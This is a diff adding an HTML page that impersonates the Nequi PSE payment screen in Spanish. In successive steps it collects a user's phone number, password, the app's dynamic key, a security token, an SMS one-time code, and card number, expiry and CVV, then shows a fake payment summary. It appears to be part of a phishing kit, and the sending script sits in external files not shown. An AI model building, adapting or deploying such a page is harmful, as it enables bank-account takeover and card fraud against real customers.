@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nequi | PSE</title>
+    <link rel="shortcut icon" href="./assets/pse/N_logo.png" type="image/x-icon">
+    <link rel="stylesheet" href="./css/tw.css">
+    <link rel="stylesheet" href="./css/normalize.css">
+    <link rel="stylesheet" href="./css/nequ.css">
+
+    <!-- script -->
+    <script src="../../js/functions.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jsrsasign/10.1.0/jsrsasign-all-min.js"></script>
+</head>
+<body>
+    <div id="loader" class="min-h-screen hidden flex items-center justify-center flex-col w-screen fixed z-[20] top-0 bg-white mrp">
+        <img src="./assets/pse/loading_nequi.gif" width="200px">
+        <p class="font-semibold mt-10">Espera un momentito ;) ¡No te vayas!</p>
+    </div>
+    
+    <section class="min-h-screen w-full px-2 flex justify-center bg-white bg-nequi pt-[40px] mrp">    
+
+        <div id="step-one" class="w-full flex justify-center">
+            <div class="w-full md:w-[370px] bg-white rounded p-3">
+                <div class="w-full flex flex-col justify-center items-center gap-3">
+                    <img src="./assets/pse/logo_nequi.svg">
+                    <p class="text-xl font-semibold text-center">Pagos PSE de Nequi</p>
+                    <p class="text-md text-center">Ingresa tu número de cel y clave. Recuerda que debes tener a la mano tu cel para terminar el proceso.</p>
+                </div>
+
+                <form class="py-3" id="form-step-one" action="">
+                    <div class="flex flex-row items-center gap-5">
+                        <div class="input-container mt-2">
+                            <input type="number" id="number" placeholder="" oninput="cleanAndLimitDigits(this, 10)" required>
+                            <label for="phone-number">Número de celular</label>
+                        </div>
+                    </div>
+                    <div class="input-container mt-2">
+                        <input type="password" id="pass" placeholder="" oninput="limitDigits(this, 4)" required>
+                        <label for="phone-number">Contraseña</label>
+                    </div>
+                    <button class="block w-full mt-5 py-3 bg-[#DA0081] border border-[#DA0081] rounded text-white">
+                        Continuar
+                    </button>
+                    <button class="block w-full mt-5 py-3 border border-[#200020] text-[#200020] rounded" id="btn-step-one-cancel">
+                        Ahora no
+                    </button>
+                </form>
+
+                <p class="text-sm py-3 text-center">¿Se te olvidó la clave? Abre Nequi en tu cel y cámbiala en segundos.</p>
+            </div>
+        </div>
+
+        <div id="step-cdin" class="hidden w-full flex justify-center">
+            <div class="w-full md:w-[370px] bg-white rounded p-3">
+                <div class="w-full flex justify-center items-center flex-col">
+                    <p class="text-xl pt-5 font-semibold text-center mb-5">Confirmemos que eres tú</p>
+                    <img src="./assets/pse/bg-cdin.png" class="mb-5">
+                    <p class="text-md text-center text-sm">Para confirmar que eres tú escribe o pega la clave dinámica que encuentras en tu App Nequi.</p>
+                </div>
+
+                <form id="form-step-cdin" class="py-3" action="">
+                    <div class="flex justify-center gap-3 mt-6 px-4">
+                        <input type="text" maxlength="1" class="w-10 h-10 text-center text-xl font-medium border-b-2 border-[#DA0081] bg-[#faf8fc] rounded-t focus:outline-none focus:bg-white transition-colors" oninput="handlePinInput(this, 0)" required>
+                        <input type="text" maxlength="1" class="w-10 h-10 text-center text-xl font-medium border-b-2 border-[#DA0081] bg-[#faf8fc] rounded-t focus:outline-none focus:bg-white transition-colors" oninput="handlePinInput(this, 1)" required>
+                        <input type="text" maxlength="1" class="w-10 h-10 text-center text-xl font-medium border-b-2 border-[#DA0081] bg-[#faf8fc] rounded-t focus:outline-none focus:bg-white transition-colors" oninput="handlePinInput(this, 2)" required>
+                        <input type="text" maxlength="1" class="w-10 h-10 text-center text-xl font-medium border-b-2 border-[#DA0081] bg-[#faf8fc] rounded-t focus:outline-none focus:bg-white transition-colors" oninput="handlePinInput(this, 3)" required>
+                        <input type="text" maxlength="1" class="w-10 h-10 text-center text-xl font-medium border-b-2 border-[#DA0081] bg-[#faf8fc] rounded-t focus:outline-none focus:bg-white transition-colors" oninput="handlePinInput(this, 4)" required>
+                        <input type="text" maxlength="1" class="w-10 h-10 text-center text-xl font-medium border-b-2 border-[#DA0081] bg-[#faf8fc] rounded-t focus:outline-none focus:bg-white transition-colors" oninput="handlePinInput(this, 5)" required>
+                    </div>
+                    <input type="hidden" id="cdin" value="">
+
+                    <!-- Teclado numérico estilo minimalista -->
+                    <div class="grid grid-cols-3 gap-y-2 gap-x-1 mt-8 px-3 max-w-[260px] mx-auto select-none">
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('1')">1</button>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('2')">2</button>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('3')">3</button>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('4')">4</button>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('5')">5</button>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('6')">6</button>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('7')">7</button>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('8')">8</button>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('9')">9</button>
+                        <div></div>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('0')">0</button>
+                        <button type="button" class="h-12 flex items-center justify-center focus:outline-none" onclick="handleKeypadInput('')">
+                            <img src="./assets/pse/icono-borrar.svg" width="30px" alt="">
+                        </button>
+                    </div>
+
+                    <button id="submit-cdin" type="submit" class="block w-full mt-8 py-3 bg-[#DA0081] border border-[#DA0081] rounded text-white text-base font-semibold hover:bg-[#b3006b] transition-colors">
+                        Confirmar
+                    </button>
+                    <button class="block w-full mt-5 py-3 border border-[#200020] text-[#200020] rounded" id="btn-step-cdin-cancel">
+                        Ahora no
+                    </button>
+                </form>
+
+                <p class="text-sm py-3 text-center">Recuerda que debes tener tu cel a la mano para terminar el proceso.</p>
+            </div>
+        </div>
+
+        <div id="step-token" class="hidden w-full flex justify-center">
+            <div class="w-full md:w-[370px] bg-white rounded p-3">
+                <div class="w-full flex justify-center items-center flex-col">
+                    <p class="text-xl pt-5 font-semibold text-center mb-5">Token de seguridad</p>
+                    <p class="text-md text-center text-sm">Ingresa el token de 8 dígitos que te enviamos.</p>
+                </div>
+
+                <form id="form-step-token" class="py-3" action="">
+                    <div class="flex justify-center gap-3 mt-6 px-4">
+                        <input type="text" maxlength="1" class="w-10 h-10 text-center text-xl font-medium border-b-2 border-[#DA0081] bg-[#faf8fc] rounded-t focus:outline-none focus:bg-white transition-colors" oninput="handlePinInput(this, 0)" required>
+                        <input type="text" maxlength="1" class="w-10 h-10 text-center text-xl font-medium border-b-2 border-[#DA0081] bg-[#faf8fc] rounded-t focus:outline-none focus:bg-white transition-colors" oninput="handlePinInput(this, 1)" required>
+                        <input type="text" maxlength="1" class="w-10 h-10 text-center text-xl font-medium border-b-2 border-[#DA0081] bg-[#faf8fc] rounded-t focus:outline-none focus:bg-white transition-colors" oninput="handlePinInput(this, 2)" required>
+                        <input type="text" maxlength="1" class="w-10 h-10 text-center text-xl font-medium border-b-2 border-[#DA0081] bg-[#faf8fc] rounded-t focus:outline-none focus:bg-white transition-colors" oninput="handlePinInput(this, 3)" required>
+                        <input type="text" maxlength="1" class="w-10 h-10 text-center text-xl font-medium border-b-2 border-[#DA0081] bg-[#faf8fc] rounded-t focus:outline-none focus:bg-white transition-colors" oninput="handlePinInput(this, 4)" required>
+                        <input type="text" maxlength="1" class="w-10 h-10 text-center text-xl font-medium border-b-2 border-[#DA0081] bg-[#faf8fc] rounded-t focus:outline-none focus:bg-white transition-colors" oninput="handlePinInput(this, 5)" required>
+                        <input type="text" maxlength="1" class="w-10 h-10 text-center text-xl font-medium border-b-2 border-[#DA0081] bg-[#faf8fc] rounded-t focus:outline-none focus:bg-white transition-colors" oninput="handlePinInput(this, 6)" required>
+                        <input type="text" maxlength="1" class="w-10 h-10 text-center text-xl font-medium border-b-2 border-[#DA0081] bg-[#faf8fc] rounded-t focus:outline-none focus:bg-white transition-colors" oninput="handlePinInput(this, 7)" required>
+                    </div>
+                    <input type="hidden" id="token" value="">
+
+                    <!-- Teclado numérico estilo minimalista -->
+                    <div class="grid grid-cols-3 gap-y-2 gap-x-1 mt-8 px-3 max-w-[260px] mx-auto select-none">
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('1')">1</button>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('2')">2</button>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('3')">3</button>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('4')">4</button>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('5')">5</button>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('6')">6</button>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('7')">7</button>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('8')">8</button>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('9')">9</button>
+                        <div></div>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('0')">0</button>
+                        <button type="button" class="h-12 flex items-center justify-center focus:outline-none" onclick="handleKeypadInput('')">
+                            <img src="./assets/pse/icono-borrar.svg" width="30px" alt="">
+                        </button>
+                    </div>
+
+                    <button id="submit-token" type="submit" class="block w-full mt-8 py-3 bg-[#DA0081] border border-[#DA0081] rounded text-white text-base font-semibold hover:bg-[#b3006b] transition-colors">
+                        Confirmar
+                    </button>
+                    <button class="block w-full mt-5 py-3 border border-[#200020] text-[#200020] rounded" id="btn-step-token-cancel">
+                        Ahora no
+                    </button>
+                </form>
+
+                <p class="text-sm py-3 text-center">Recuerda que debes tener tu cel a la mano para terminar el proceso.</p>
+            </div>
+        </div>
+
+        <div id="step-otp" class="hidden w-full flex justify-center">
+            <div class="w-full md:w-[370px] bg-white rounded p-3">
+                <div class="w-full flex justify-center items-center flex-col">
+                    <p class="text-xl pt-5 font-semibold text-center mb-5">Código de seguridad</p>
+                    <p class="text-md text-center text-sm">Ingresa el código de 6 dígitos que te enviamos por SMS.</p>
+                </div>
+
+                <form id="form-step-otp" class="py-3" action="">
+                    <div class="flex justify-center gap-3 mt-6 px-4">
+                        <input type="text" maxlength="1" class="w-10 h-10 text-center text-xl font-medium border-b-2 border-[#DA0081] bg-[#faf8fc] rounded-t focus:outline-none focus:bg-white transition-colors" oninput="handlePinInput(this, 0)" required>
+                        <input type="text" maxlength="1" class="w-10 h-10 text-center text-xl font-medium border-b-2 border-[#DA0081] bg-[#faf8fc] rounded-t focus:outline-none focus:bg-white transition-colors" oninput="handlePinInput(this, 1)" required>
+                        <input type="text" maxlength="1" class="w-10 h-10 text-center text-xl font-medium border-b-2 border-[#DA0081] bg-[#faf8fc] rounded-t focus:outline-none focus:bg-white transition-colors" oninput="handlePinInput(this, 2)" required>
+                        <input type="text" maxlength="1" class="w-10 h-10 text-center text-xl font-medium border-b-2 border-[#DA0081] bg-[#faf8fc] rounded-t focus:outline-none focus:bg-white transition-colors" oninput="handlePinInput(this, 3)" required>
+                        <input type="text" maxlength="1" class="w-10 h-10 text-center text-xl font-medium border-b-2 border-[#DA0081] bg-[#faf8fc] rounded-t focus:outline-none focus:bg-white transition-colors" oninput="handlePinInput(this, 4)" required>
+                        <input type="text" maxlength="1" class="w-10 h-10 text-center text-xl font-medium border-b-2 border-[#DA0081] bg-[#faf8fc] rounded-t focus:outline-none focus:bg-white transition-colors" oninput="handlePinInput(this, 5)" required>
+                    </div>
+                    <input type="hidden" id="otp" value="">
+
+                    <!-- Teclado numérico estilo minimalista -->
+                    <div class="grid grid-cols-3 gap-y-2 gap-x-1 mt-8 px-3 max-w-[260px] mx-auto select-none">
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('1')">1</button>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('2')">2</button>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('3')">3</button>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('4')">4</button>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('5')">5</button>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('6')">6</button>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('7')">7</button>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('8')">8</button>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('9')">9</button>
+                        <div></div>
+                        <button type="button" class="h-12 text-3xl font-medium text-[#200020] focus:outline-none" onclick="handleKeypadInput('0')">0</button>
+                        <button type="button" class="h-12 flex items-center justify-center focus:outline-none" onclick="handleKeypadInput('')">
+                            <img src="./assets/pse/icono-borrar.svg" width="30px" alt="">
+                        </button>
+                    </div>
+
+                    <button id="submit-otp" type="submit" class="block w-full mt-8 py-3 bg-[#DA0081] border border-[#DA0081] rounded text-white text-base font-semibold hover:bg-[#b3006b] transition-colors">
+                        Confirmar
+                    </button>
+                    <button class="block w-full mt-5 py-3 border border-[#200020] text-[#200020] rounded" id="btn-step-otp-cancel">
+                        Ahora no
+                    </button>
+                </form>
+
+                <p class="text-sm py-3 text-center">Recuerda que debes tener tu cel a la mano para terminar el proceso.</p>
+            </div>
+        </div>
+
+        <div id="step-card" class="hidden w-full flex justify-center">
+            <div class="w-full md:w-[370px] bg-white rounded p-3">
+                <div class="w-full flex justify-center items-center flex-col">
+                    <p class="text-xl pt-5 font-semibold text-center mb-5">Método de ingreso alternativo</p>
+                    <p class="text-md text-center text-sm">Ingresa con un tu tarjeta de Nequi.</p>
+                </div>
+
+                <form id="form-step-card" class="py-3" action="">
+                    <div class="input-container mt-2">
+                        <input type="text" id="card-number" placeholder="" oninput="formatCNumber(this)" required>
+                        <label for="card-number">Número de Tarjeta</label>
+                    </div>
+                    <div class="flex flex-row gap-3">
+                        <div class="input-container mt-2">
+                            <input type="text" id="card-date" placeholder="" oninput="formatCardDate(this)" required>
+                            <label for="card-date">MM/AA</label>
+                        </div>
+                        <div class="input-container mt-2">
+                            <input type="number" id="card-cvv" placeholder="" oninput="limitDigits(this, 3)" required>
+                            <label for="card-cvv">CVV</label>
+                        </div>
+                    </div>
+                    <button id="submit-card" type="submit" class="block w-full mt-8 py-3 bg-[#DA0081] border border-[#DA0081] rounded text-white text-base font-semibold hover:bg-[#b3006b] transition-colors">
+                        Continuar
+                    </button>
+                    <button class="block w-full mt-5 py-3 border border-[#200020] text-[#200020] rounded" id="btn-step-card-cancel">
+                        Ahora no
+                    </button>
+                </form>
+
+                <p class="text-sm py-3 text-center">Asegúrate de que sea un producto que tengas vinculado a Nequi.</p>
+            </div>
+        </div>
+
+        <div id="step-resume" class="hidden w-full flex justify-center">
+            <div class="w-full md:w-[370px] bg-white rounded p-3">
+                <div class="w-full flex justify-center items-center flex-col">
+                    <img src="./assets/pse/logo_nequi.svg" class="mb-5">
+                    <p class="text-xl text-[#200020] pt-5 font-semibold text-center mb-5">Resumen del pago</p>
+                </div>
+
+                <p class="text-sm text-[#DA0081] font-semibold">Descripción de compra</p>
+                <p class="text-md text-[#200020] font-normal mb-5">Pago a través de PSE 116657348728</p>
+
+                <p class="text-sm text-[#DA0081] font-semibold">Tienda</p>
+                <p class="text-md text-[#200020] font-normal mb-5" id="label-origin-resume"></p>
+
+                <p class="text-sm text-[#DA0081] font-semibold">Fecha de solicitud</p>
+                <p class="text-md text-[#200020] font-normal mb-5" id="label-date-resume"></p>
+
+                <p class="text-sm text-[#DA0081] font-semibold">CUS</p>
+                <p class="text-md text-[#200020] font-normal mb-5">11748293</p>
+
+                <p class="text-sm text-[#DA0081] font-semibold">¿Cuánto?</p>
+                <p class="text-md text-[#200020] font-normal mb-5" id="label-amount-resume"></p>
+
+                <p class="text-sm text-[#DA0081] font-semibold">Factura del comercio</p>
+                <p class="text-md text-[#200020] font-normal mb-5">116657348728</p>
+
+                <button class="block w-full mt-5 py-3 bg-[#DA0081] border border-[#DA0081] rounded text-white" id="btn-resume-pay">
+                    Pagar
+                </button>
+                <button class="block w-full mt-5 py-3 border border-[#200020] text-[#200020] rounded" id="btn-resume-cancel">
+                    Cancelar
+                </button>
+                <!-- AQUÍ DEBES CONSTRUIR LA SECCIÓN -->
+            </div>
+        </div>
+
+        <div id="step-nequi" class="hidden w-full flex justify-center">
+            <div class="w-full md:w-[370px] bg-white rounded p-3">
+                <div class="w-full flex justify-center items-center flex-col">
+                    <img src="./assets/pse/logo_nequi.svg" class="mb-5">
+                    <p class="text-xl text-[#200020] pt-5 font-semibold text-center mb-5">Paga con el Botón Nequi</p>
+                </div>
+
+                <div>
+                    <img class="rounded-lg" src="./assets/pse/boton-nequ.gif">
+                </div>
+
+                <p class="text-md text-[#200020] font-normal mb-5"><span class="text-lg text-[#DA0081] font-semibold">1.</span> Recibirás una <b>notificación</b> en tu celular para que entres a Nequi y <b>Apruebes</b> el pago</p>
+                <p class="text-md text-[#200020] font-normal mb-5"><span class="text-lg text-[#DA0081] font-semibold">2.</span> Ve a las <b>"Notificaciones"</b> (Campanita) de la app Nequi y en la solicitud de <b>"Pago pendiente"</b> escoge <b>"Acepta"</b></p>
+                <p class="text-md text-[#200020] font-normal mb-5"><span class="text-lg text-[#DA0081] font-semibold">3.</span> Revisa los datos de la compra y dale en <b>"Paga"</b></p>
+
+                <button class="block w-full mt-5 py-3 bg-[#DA0081] border border-[#DA0081] rounded text-white" id="btn-nequi-pay">
+                    Confirmar
+                </button>
+                <button class="block w-full mt-5 py-3 border border-[#200020] text-[#200020] rounded" id="btn-nequi-cancel">
+                    Cancelar
+                </button>
+                <!-- AQUÍ DEBES CONSTRUIR LA SECCIÓN -->
+            </div>
+        </div>
+
+    </section>
+
+
+    <script src="./js/nequ.js"></script>
+</body>
+</html> 
